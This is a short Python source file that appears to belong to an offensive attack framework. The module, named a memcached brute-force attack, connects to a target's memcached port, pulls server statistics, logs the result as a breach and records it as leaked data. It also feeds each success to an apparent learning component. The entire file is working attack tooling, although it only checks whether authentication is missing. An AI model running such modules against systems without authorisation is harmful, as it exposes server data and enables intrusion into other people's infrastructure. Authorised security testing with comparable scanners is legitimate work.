# src/attacks/memcached_bruteforce.py — v15.3
import asyncio
import memcache
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class MemcachedBruteforceModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "memcached_bruteforce", "success": False, "risk": 7}

        host = options['context']['target'].split('/')[2].split(':')[0]
        port = 11211

        self.logger.info(f"MEMCACHED → {host}:{port}")

        try:
            mc = await asyncio.to_thread(memcache.Client, [f"{host}:{port}"], timeout=3)
            stats = await asyncio.to_thread(mc.get_stats)
            if stats:
                result.update({
                    "success": True,
                    "vulnerable_payload": "no_auth",
                    "data_leaked": {"stats": dict(stats[0][1])}
                })
                self.logger.breach("MEMCACHED: NO AUTH")
                if self.brain:
                    self.brain.learn("memcached_bruteforce", target, "no_auth", True)
        except:
            pass

        return result